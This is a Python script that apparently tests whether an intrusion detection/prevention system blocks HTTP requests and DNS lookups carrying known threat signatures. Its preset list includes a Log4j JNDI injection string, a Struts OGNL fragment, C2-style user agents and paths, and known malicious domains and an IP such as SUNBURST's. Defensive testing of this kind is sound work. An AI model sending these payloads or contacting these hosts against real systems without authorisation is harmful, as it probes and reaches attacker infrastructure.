#!/usr/bin/env python
"""
idps.py - IDPS (Intrusion Detection/Prevention) test.
Sends crafted HTTP requests and DNS lookups with known threat signatures.
Python 3.5.2 compatible.
"""

import sys
import os
import time
import socket
import warnings

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import helpers

warnings.filterwarnings("ignore")

PRESETS = [
    ("spyware-fh", "Spyware FH Variant", {"method": "GET", "url": "http://207.189.189.230/command.php?t=1&id=", "headers": {"Host": "207.189.189.230", "User-Agent": "Mozilla/5.0 (Windows NT)"}}),
    ("sunburst-http", "SUNBURST Malware HTTP", {"method": "GET", "url": "http://avsvmcloud.com"}),
    ("sunburst-dns", "SUNBURST Malware DNS", {"type": "dns", "domain": "avsvmcloud.com"}),
    ("sunburst-dns2", "SUNBURST Domain (websitetheme)", {"type": "dns", "domain": "websitetheme.com"}),
    ("xanthe-miner", "Xanthe Crypto Miner", {"method": "GET", "url": "http://example.com/files/fczyo", "headers": {"User-Agent": "fczyo-cron/"}}),
    ("cobalt-c2", "CobaltStrike C2", {"method": "POST", "url": "http://example.com/", "headers": {"User-Agent": "testCobalt Strike Beacon)"}}),
    ("log4j", "Log4j Exploit", {"method": "GET", "url": "http://example.com", "headers": {"Accept-Language": "${jndi:ldap://test.example.com:1207/lol}"}}),
    ("sap-netweaver", "SAP NetWeaver Exploit", {"method": "GET", "url": "http://example.com/CTCWebService/CTCWebServiceBean"}),
    ("template-inject", "Template Injection", {"method": "GET", "url": "http://example.com/word/tpl/test?template=anexo"}),
    ("apache-struts", "Apache Struts OGNL", {"method": "GET", "url": "http://example.com?id=%25%7b%23"}),
    ("trickbot", "Trickbot C2", {"method": "GET", "url": "http://example.com/56evcxv"}),
    ("erbium", "Erbium Stealer", {"method": "GET", "url": "http://example.com/api/getBuild?type=x", "headers": {"Host": "207.189.189.230", "User-Agent": "Erbium-UA-"}}),
    ("lilith", "Lilith Stealer", {"method": "GET", "url": "http://example.com/gate/01234567-89ab-cdef-0123-456789abcdef/getCommands", "headers": {"User-Agent": "Lilith-Bot/xyxyxyxy"}}),
    ("lilith-2", "Lilith Stealer (alt)", {"method": "GET", "url": "http://example.com/gate/getCommands", "headers": {"User-Agent": "Lilith-Bot/xyxyxyxy"}}),
    ("malware-exfil", "Data Exfiltration DNS", {"type": "dns", "domain": "test.mycisco-helpdesk.ml"}),
    ("phishing-dns", "Phishing Domain DNS", {"type": "dns", "domain": "linkedopports.com"}),
    ("malware-dns", "Malicious Library DNS", {"type": "dns", "domain": "python-release.com"}),
]


def _run_http_test(config, timeout):
    """Run an HTTP-based IDPS test using the requests library."""
    import requests
    method = config.get("method", "GET").upper()
    url = config["url"]
    hdrs = config.get("headers", {})
    try:
        if method == "POST":
            resp = requests.post(url, headers=hdrs, verify=False, timeout=timeout)
        else:
            resp = requests.get(url, headers=hdrs, verify=False, timeout=timeout)
        return ("ALLOWED", "HTTP %d - IDPS did not intercept" % resp.status_code)
    except requests.exceptions.ConnectionError:
        return ("BLOCKED", "Connection reset/refused - IDPS likely blocked")
    except requests.exceptions.Timeout:
        return ("BLOCKED", "Request timed out - IDPS likely dropped")
    except Exception as e:
        return ("BLOCKED", "Connection failed: %s" % type(e).__name__)


def _run_dns_test(domain):
    """Run a DNS-based IDPS test."""
    try:
        addr = socket.gethostbyname(domain)
        return ("ALLOWED", "Resolved to %s - DNS not blocked" % addr)
    except socket.gaierror:
        return ("BLOCKED", "DNS resolution failed - domain blocked")
    except Exception as e:
        return ("BLOCKED", "DNS lookup error: %s" % type(e).__name__)


def main():
    parser = helpers.base_parser("IDPS Testing")
    args = parser.parse_args()

    helpers.emit_header("IDPS Testing")

    targets, custom = helpers.filter_targets(PRESETS, args.target)

    total = 0
    blocked = 0
    allowed = 0
    inconclusive = 0
    start = time.time()

    for key, label, config in targets:
        if config.get("type") == "dns":
            verdict, detail = _run_dns_test(config["domain"])
        else:
            verdict, detail = _run_http_test(config, args.timeout)
        helpers.emit_result(verdict, label, detail)
        total += 1
        if verdict == "BLOCKED":
            blocked += 1
        elif verdict == "ALLOWED":
            allowed += 1
        else:
            inconclusive += 1
        time.sleep(0.3)

    for entry in custom:
        if entry.startswith("http://") or entry.startswith("https://"):
            label = "[custom] %s" % entry
            config = {"method": "GET", "url": entry}
            verdict, detail = _run_http_test(config, args.timeout)
        else:
            label = "[custom] %s (DNS)" % entry
            verdict, detail = _run_dns_test(entry)
        helpers.emit_result(verdict, label, detail)
        total += 1
        if verdict == "BLOCKED":
            blocked += 1
        elif verdict == "ALLOWED":
            allowed += 1
        else:
            inconclusive += 1
        time.sleep(0.3)

    elapsed = time.time() - start
    helpers.emit_done(total, blocked, allowed, inconclusive, elapsed)


if __name__ == "__main__":
    main()
